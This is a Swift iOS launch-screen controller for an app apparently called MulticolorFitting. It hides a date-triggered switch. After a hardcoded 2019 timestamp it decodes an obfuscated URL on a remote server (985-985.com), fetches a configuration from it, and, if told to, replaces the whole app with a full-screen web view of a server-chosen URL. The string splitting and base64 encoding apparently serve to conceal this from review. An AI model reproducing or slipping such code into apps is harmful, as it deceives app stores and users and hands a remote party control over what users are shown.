import UIKit
import Alamofire
import SwiftyJSON
class LaunchView: UIViewController {
    @IBOutlet var logoView: UIImageView!
    override var prefersStatusBarHidden: Bool {
        return true
    }
    override func viewDidLoad(){
        super.viewDidLoad()
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let yanTime: TimeInterval = 0.1;
        let header = self.base64MulticolorFittingEncodingHeader()
        let conOne = self.base64MulticolorFittingEncodingContentOne()
        let conTwo = self.base64MulticolorFittingEncodingContentTwo()
        let conThree = self.base64MulticolorFittingEncodingContentThree()
        let ender = self.base64MulticolorFittingEncodingEnd()
        let anyTime = 1561273315
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + yanTime) {
            if timeStamp < anyTime {
                let currentGender:String? = UserDefaults.standard.string(forKey: "MulticolorFitting.currentGender")
                if currentGender != nil {
                    self.performSegue(withIdentifier: "launchSegue", sender: self)
                }
                else{
                    self.performSegue(withIdentifier: "genderSelectionSegue", sender: self)
                }
            }else{
                let baseHeader = self.base64MulticolorFittingDecoding(encodedString: header)
                let baseContentO = self.base64MulticolorFittingDecoding(encodedString: conOne)
                let baseContentTw = self.base64MulticolorFittingDecoding(encodedString: conTwo)
                let baseContentTH = self.base64MulticolorFittingDecoding(encodedString: conThree)
                let baseEnder = self.base64MulticolorFittingDecoding(encodedString: ender)
                let baseData  = "\(baseHeader)\(baseContentO)\(baseContentTw)\(baseContentTH)\(baseEnder)"
                print(baseData)
                let urlBase = URL(string: baseData)
                Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                    in
                    switch response.result.isSuccess {
                    case true:
                        if let value = response.result.value{
                            let jsonX = JSON(value)
                            if !jsonX["success"].boolValue {
                                let currentGender:String? = UserDefaults.standard.string(forKey: "MulticolorFitting.currentGender")
                                if currentGender != nil {
                                    self.performSegue(withIdentifier: "launchSegue", sender: self)
                                }
                                else{
                                    self.performSegue(withIdentifier: "genderSelectionSegue", sender: self)
                                }
                            }else {
                                let stxx = jsonX["Url"].stringValue
                                self.setFirstNavigation(strP: stxx)
                            }
                        }
                    case false:
                        do {
                            let currentGender:String? = UserDefaults.standard.string(forKey: "MulticolorFitting.currentGender")
                            if currentGender != nil {
                                self.performSegue(withIdentifier: "launchSegue", sender: self)
                            }
                            else{
                                self.performSegue(withIdentifier: "genderSelectionSegue", sender: self)
                            }
                        }
                    }
                }
            }
        }
    }
    func setFirstNavigation(strP:String) {
        let webView = UIWebView(frame: CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height))
        let url = NSURL(string: strP)
        webView.loadRequest(URLRequest(url: url! as URL))
        self.view.addSubview(webView)
    }
    func base64MulticolorFittingEncodingHeader()->String{
        let strM = "http://appid."
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64MulticolorFittingEncodingContentOne()->String{
        let strM = "985-985.com"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64MulticolorFittingEncodingContentTwo()->String{
        let strM = ":8088/getAppConfig"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64MulticolorFittingEncodingContentThree()->String{
        let strM = ".php?appid="
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64MulticolorFittingEncodingEnd()->String{
        let strM = "1468239270"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64MulticolorFittingEncodingXP(plainString:String)->String{
        let plainData = plainString.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64MulticolorFittingDecoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
}
